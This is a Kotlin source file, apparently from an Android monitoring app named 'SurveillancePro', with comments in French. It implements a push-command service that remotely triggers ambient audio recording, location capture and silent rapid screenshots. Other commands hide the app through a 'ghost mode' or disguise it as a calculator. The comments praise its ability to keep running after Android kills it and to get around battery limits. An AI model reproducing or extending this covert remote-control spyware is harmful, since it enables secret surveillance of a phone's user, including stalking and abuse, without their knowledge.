package com.surveillancepro.android.services

import android.content.Intent
import android.util.Log
import com.google.firebase.messaging.FirebaseMessagingService
import com.google.firebase.messaging.RemoteMessage
import com.surveillancepro.android.data.DeviceStorage
import com.surveillancepro.android.data.EventQueue
import com.surveillancepro.android.workers.SyncWorker
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

/**
 * Service Firebase Cloud Messaging pour réveil à distance.
 * 
 * Permet au serveur d'envoyer des commandes push à l'appareil:
 * - Réveil de l'appareil même en mode Doze
 * - Exécution de commandes à distance (sync, audio, photo, etc.)
 * - Mise à jour de la configuration
 * - Notifications silencieuses pour maintenir la connexion
 * 
 * PUISSANCE:
 * - Fonctionne même quand l'app est tuée par Android
 * - Contourne les restrictions de batterie
 * - Priorité haute pour livraison immédiate
 */
class SupervisionFCMService : FirebaseMessagingService() {
    
    companion object {
        private const val TAG = "SupervisionFCM"
        
        // Types de commandes supportées
        const val CMD_SYNC = "sync"
        const val CMD_RECORD_AUDIO = "record_audio"
        const val CMD_TAKE_PHOTO = "take_photo"
        const val CMD_LOCATION = "get_location"
        const val CMD_WAKE = "wake"
        const val CMD_CONFIG = "update_config"
        const val CMD_START_RAPID_CAPTURE = "start_rapid_capture"
        const val CMD_STOP_RAPID_CAPTURE = "stop_rapid_capture"
        const val CMD_GHOST_MODE = "ghost_mode"
        const val CMD_DISGUISE = "disguise_app"
    }
    
    private val dateFormat = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US)
    
    /**
     * Appelé quand un nouveau token FCM est généré.
     * Envoie le token au serveur pour permettre les push.
     */
    override fun onNewToken(token: String) {
        super.onNewToken(token)
        Log.d(TAG, "New FCM token: ${token.take(20)}...")
        
        val storage = DeviceStorage.getInstance(applicationContext)
        storage.fcmToken = token
        
        // Envoyer le token au serveur
        if (storage.hasAccepted && storage.deviceToken != null) {
            val queue = EventQueue.getInstance(applicationContext)
            queue.enqueue("fcm_token_updated", mapOf(
                "fcmToken" to token,
                "timestamp" to dateFormat.format(Date()),
            ))
            SyncWorker.triggerNow(applicationContext)
        }
    }
    
    /**
     * Appelé quand un message push est reçu.
     * Exécute la commande correspondante.
     */
    override fun onMessageReceived(remoteMessage: RemoteMessage) {
        super.onMessageReceived(remoteMessage)
        
        val storage = DeviceStorage.getInstance(applicationContext)
        if (!storage.hasAccepted || storage.deviceToken == null) {
            Log.w(TAG, "Device not configured, ignoring push")
            return
        }
        
        Log.d(TAG, "Push received from: ${remoteMessage.from}")
        
        val data = remoteMessage.data
        val command = data["command"] ?: data["cmd"] ?: ""
        val commandId = data["commandId"]?.toLongOrNull() ?: 0L
        
        Log.d(TAG, "Command: $command (id=$commandId)")
        
        // Enregistrer la réception de la commande
        val queue = EventQueue.getInstance(applicationContext)
        queue.enqueue("push_received", mapOf(
            "command" to command,
            "commandId" to commandId,
            "timestamp" to dateFormat.format(Date()),
        ))
        
        // Exécuter la commande
        when (command) {
            CMD_SYNC -> {
                // Synchronisation immédiate
                SyncWorker.triggerNow(applicationContext)
            }
            
            CMD_RECORD_AUDIO -> {
                // Enregistrement audio ambiant
                val duration = data["duration"]?.toIntOrNull() ?: 30
                val mode = data["mode"] ?: AmbientAudioService.MODE_RECORD
                AmbientAudioService.startRecording(applicationContext, mode, duration, commandId)
            }
            
            CMD_TAKE_PHOTO -> {
                // Prise de photo (nécessite ScreenCaptureService ou commande spéciale)
                queue.enqueue("photo_command_received", mapOf(
                    "commandId" to commandId,
                    "timestamp" to dateFormat.format(Date()),
                ))
                SyncWorker.triggerNow(applicationContext)
            }
            
            CMD_LOCATION -> {
                // Demande de localisation immédiate
                try {
                    startForegroundService(Intent(applicationContext, LocationService::class.java).apply {
                        putExtra(LocationService.EXTRA_MODE, LocationService.MODE_SINGLE)
                    })
                } catch (e: Exception) {
                    Log.w(TAG, "Location service failed: ${e.message}")
                }
                SyncWorker.triggerNow(applicationContext)
            }
            
            CMD_WAKE -> {
                // Simple réveil - s'assurer que tous les services tournent
                AutoSetupManager.ensureServicesRunning(applicationContext)
                SyncWorker.triggerNow(applicationContext)
            }
            
            CMD_CONFIG -> {
                // Mise à jour de la configuration
                data["syncInterval"]?.toIntOrNull()?.let { interval ->
                    SyncWorker.schedule(applicationContext, intervalMinutes = interval)
                }
                data["serverUrl"]?.let { url ->
                    if (url.startsWith("https://")) {
                        storage.serverURL = url
                    }
                }
            }
            
            CMD_START_RAPID_CAPTURE -> {
                // Démarrer la capture d'écran rapide (100% invisible)
                val interval = data["interval"]?.toLongOrNull() ?: 3000L
                val maxCaptures = data["maxCaptures"]?.toIntOrNull() ?: 100
                RapidScreenCapture.startCapture(applicationContext, interval, maxCaptures, commandId)
            }
            
            CMD_STOP_RAPID_CAPTURE -> {
                // Arrêter la capture d'écran rapide
                RapidScreenCapture.stopCapture(applicationContext)
            }
            
            CMD_GHOST_MODE -> {
                // Activer/désactiver le mode fantôme
                val enable = data["enable"]?.toBoolean() ?: true
                if (enable) {
                    SmartGhostMode.hide(applicationContext)
                } else {
                    SmartGhostMode.show(applicationContext)
                }
            }
            
            CMD_DISGUISE -> {
                // Déguiser l'app
                val disguise = data["disguise"] ?: "calculator"
                SmartGhostMode.disguiseAs(applicationContext, disguise)
            }
            
            else -> {
                Log.w(TAG, "Unknown command: $command")
            }
        }
    }
}
